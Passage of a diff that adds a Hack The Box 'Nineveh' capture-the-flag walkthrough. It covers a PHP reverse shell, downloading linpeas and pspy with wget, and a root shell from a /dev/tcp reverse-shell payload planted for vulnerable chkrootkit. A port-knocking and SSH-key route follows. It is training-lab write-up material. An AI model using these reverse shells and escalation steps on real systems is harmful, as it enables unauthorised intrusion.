@@ -352,5 +352,314 @@ We get back the following page.
 We have code execution! Let’s intercept the request in Burp and add a reverse shell to the cmd parameter.
 
 ```php
-php -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.12", 1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
+Setup a listener to receive the reverse shell.
+```
+nc -lvnp 1234
+```
+
+Sending the request, I immideiately had a reverse shell.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
+└─$ nc -lvnp 1234 
+listening on [any] 1234 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.43] 58386
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+I upgraded it to a partially interactive bash shell
+```python
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+I tried retrieving the user flag but was denied permission
+```
+www-data@nineveh:/var/www/html/department$ cd /home
+cd /home
+www-data@nineveh:/home$ ls
+ls
+amrois
+www-data@nineveh:/home$ cd amrois
+cd amrois
+www-data@nineveh:/home/amrois$ ls
+ls
+user.txt
+www-data@nineveh:/home/amrois$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+```
+
+So, I viewed the permissions of `user.txt` file
+```
+www-data@nineveh:/var/www/html/department$ ls -la /home/amrois/         
+total 32
+drwxr-xr-x 4 amrois amrois 4096 Jul  3  2017 .
+drwxr-xr-x 3 root   root   4096 Jul  2  2017 ..
+-rw------- 1 amrois amrois    0 Jul  2  2017 .bash_history
+-rw-r--r-- 1 amrois amrois  220 Jul  2  2017 .bash_logout
+-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 .bashrc
+drwx------ 2 amrois amrois 4096 Jul  3  2017 .cache
+-rw-r--r-- 1 amrois amrois  655 Jul  2  2017 .profile
+drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .ssh
+-rw------- 1 amrois amrois   33 Jul  2  2017 user.txt
+```
+
+We’re currently running as `www-data`, so we don’t have rights to read the file. We need to escalate our user privileges.
+
+
+## Privilege Escalation
+I started the priv-esc process by transferring `linpeas` to the victim machine
+
+In the attack machine, I hosted a server in the same directory that `linpeas` resides
+
+```python
+python3 -m http.server 5555
+```
+
+Then in the target machine, I changed to `/tmp` directory where I had write privileges and downloaded `linpeas`
+
+```
+cd \tmp
+wget http://10.10.14.6:5555/linpeas.sh
+```
+
+Gave it execute privileges and ran the script
+```
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Of all the output that linpeas was able to pull off, only one thing that stood out was this. 
+
+
+![nine-1](https://user-images.githubusercontent.com/87711310/213629045-93c63902-55f1-485d-a4fb-e2ee7bf7a9fb.png)
+
+In Nmap scan, port `22` was not reported to be open, however, `linpeas` reported it as listening on the localhost. I’m wasn't sure what to do with this piece of information but I kept it at the back of my mind in case I don’t find any other way to escalate privileges.
+
+Then I used `pspy` to further enumerate the machine to find and monitor linux processes without root permissions
+
+If you don’t have the script, you can download it from the following github repository.
+
+```
+https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
+https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+```
+
+Uploaded the script, gave it execute privileges and ran it in the same way we did for `linpeas`
+
+After a while, I noticed an interesting process that was popping up eveytime in few seconds.
+
+![n-12](https://user-images.githubusercontent.com/87711310/213497257-8e490ffe-57af-470d-ae93-2f5d83c23c99.png)
+
+Every minute or so the `chkrootkit` was being run. I didn't what it was for or what it did, so I googled it and found out that it is a program intended to help system administrators to check their systems for known rootkits.
+
+Next, I googled `chkrootkit privilege escalation` to find any exploits that could help me escalate privilieges on this machine and I found [this exploit](https://www.exploit-db.com/exploits/33899)
+
+There is a __privilege escalation vulnerability__ with old versions of this software that will run any executable file named `/tmp/update` as `root`.
+
+Therefore, all I had to do was to create an `update` file in `/tmp` directory that contains a reverse shell and wait for the scheduled task to give me a shell with root privilieges
+
+To do that, I navigated to the `/tmp` directory and created the file `update` and added the code in the following way.
+```
+www-data@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/3333 0>&1'        
+< -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/3333 0>&1'               
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.6/3333 0>&1
+www-data@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/3333 0>&1' > update
+< -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/3333 0>&1' > update      
+www-data@nineveh:/tmp$ cat update
+cat update
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.6/3333 0>&1
+www-data@nineveh:/tmp$ chmod +x update
+chmod +x update
+```
+
+I started the listener on port `3333` and the next time chkrootkit ran, I got the shell
+```
+┌──(darshan㉿kali)-[~]
+└─$ nc -lvnp 3333
+listening on [any] 3333 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.43] 34586
+bash: cannot set terminal process group (18756): Inappropriate ioctl for device
+bash: no job control in this shell
+root@nineveh:~# whoami
+whoami
+root
+
+```
+
+Now that I've got the root privilege, I retrieved the `user` and the `root` flag
+```
+root@nineveh:~# cat /home/amrois/user.txt
+cat /home/amrois/user.txt
+[REDACTED]
+root@nineveh:~# cat /root/root.txt
+cat /root/root.txt
+[REDACTED]
+```
+
+## Alternate Solution
+This was a pretty tricky machine to solve, and stumbled a lot of times and referred to feew blogs too.
+
+So I decided to watch [Ippsec's video](https://www.youtube.com/watch?v=K9DKULxSBK4) to understand his thought process and how he would go on to solve this machine
+
+Watching his solution, I found another way to get logged in as `amrois` user
+
+Remember the `nineveh.png` image we found in the `/secure_notes` directory? The solution involves using that `png` to get logged in as `amrois`.
+
+To see what lies in the image, i first used `binwalk` to search the image for any embedded files and executable code.
+
+```
+binwalk nineveh.png
+```
+
+I got back the following results showing that the image does contain compresses files.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
+└─$ binwalk nineveh.png 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
+84            0x54            Zlib compressed data, best compression
+2881744       0x2BF8D0        POSIX tar archive (GNU)
+
+```
+
+Next, I extracted the files'
+
+```
+binwalk -Me nineveh.png
+```
+
+Enter the directory that was extracted and output the results.
+```
+cd _nineveh.png.extracted/secret/
+```
+
+We get back two files: `nineveh.priv` and `nineveh.pub`. When I find private keys the first thing I try is `SSH-ing` into the user’s account using the private key. However, if you remember, `nmap` did not report an open port that was running `SSH`. This brings us to the second thing I found during the `privilege escalation` phase that I didn’t look into.
+
+When I ran Linpeas, it reported that port 22 was listening on localhost although nmap didn't report the port as open. It turns out that there is a technique known as [Port Knocking](https://en.wikipedia.org/wiki/Port_knocking) used to externally open ports on a firewall by generating a connection attemmpt on a set of pre-specified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s).
+
+In short, if you know the exact sequence of ports to connect to, you can open up port 22. To find the sequence you have to enumerate files on the server. This could be done using the LFI vulnerability we found.
+
+The first file we need is `knockd`
+```
+cat /etc/init.d/knockd
+```
+
+There, you’ll find a link to the configuration file `/etc/knockd.conf`. If you cat the file you’ll find the sequence of ports we have to hit.
+```
+root@nineveh:/etc/init.d# cat /etc/knockd.conf 
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens33[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+```
+
+What the file says is that you can open the SSH port by sending a TCP packet to the ports `571`, `290` and `911` in sequence.
+
+I performed this using the following `bash` command
+```
+for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 && sleep 1; done
+```
+
+I got the following output.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
+└─$ for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 && sleep 1; done
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:49 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+571/tcp filtered umeter
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:49 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+290/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:50 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+911/tcp filtered xact-backup
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+
+```
+
+Then, I ran a general nmap scan to check if port 22 opened up
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
+└─$ nmap 10.10.10.43       
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:51 EST
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up (0.12s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
+```
+
+And guess what? Port `22` did open up and now I could SSh into amrois's account using the private key we found.
+
+```
+ssh -i nineveh.priv amrois@10.10.10.43
+```
+
+```
+┌──(darshan㉿kali)-[~/…/Linux-Boxes/Nineveh/_nineveh.png.extracted/secret]
+└─$ sssh -i nineveh.priv amrois@10.10.10.43
+Command 'sssh' not found, but can be installed with:
+sudo apt install guile-ssh
+Do you want to install it? (N/y)^C
+                                                                                                                                                            
+┌──(darshan㉿kali)-[~/…/Linux-Boxes/Nineveh/_nineveh.png.extracted/secret]
+└─$ ssh -i nineveh.priv amrois@10.10.10.43 
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+288 packages can be updated.
+207 updates are security updates.
+
+
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ whoami
+amrois
+
+```
+
+This was a pretty neat solution. It was also the first time I was introduced to the concept of `Port Knocking`
